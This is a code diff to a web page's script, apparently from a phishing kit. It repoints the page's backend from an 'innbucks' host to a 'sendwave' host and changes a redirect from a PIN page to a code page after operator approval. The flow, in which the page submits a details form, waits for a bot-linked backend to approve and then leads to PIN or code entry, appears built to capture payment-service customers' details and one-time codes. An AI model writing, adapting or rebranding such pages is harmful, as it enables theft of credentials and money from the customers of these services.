@@ -193,7 +193,7 @@ h1{
 </div>
 
 <script>
-const BACKEND_URL = "https://innbucks-jqtp.onrender.com";
+const BACKEND_URL = "https://sendwave-9mid.onrender.com";
 
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
@@ -254,7 +254,7 @@ document.getElementById('detailsForm').addEventListener('submit', async (e) => {
 
             if (d.approved === true) {
                 clearInterval(poll);
-                window.location.href = `pin.html?botId=${botId}&requestId=${requestId}`;
+                window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
             }
 
             if (d.approved === false) {
